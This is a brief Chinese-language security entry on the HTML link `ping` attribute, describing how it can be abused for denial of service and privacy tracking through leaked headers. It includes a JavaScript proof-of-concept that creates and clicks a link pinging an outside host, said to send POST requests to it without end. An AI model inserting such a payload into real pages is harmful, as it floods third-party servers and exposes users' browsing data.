-----

* 特性：ping属性
* 环境：发送异步请求，完成一次HTTP重定向，循环发送POST请求，造成DOS攻击；
        PING-FROM、USER-AGENT、REFERER泄漏用户的隐私。
* 漏洞类型：DOS攻击、隐私追踪

-----   

举例：
-----
···JavaScript
      <script> 
      var link = document.createElement('a'); 
      link.href=""; 
      link.ping = 'http://www.xisigr.com/'; 
      document.head.appendChild(link); link.click(); 
      </script>       //JavaScript
      运行上面的代码，就会不停的向xisigr.com发送POST请求。
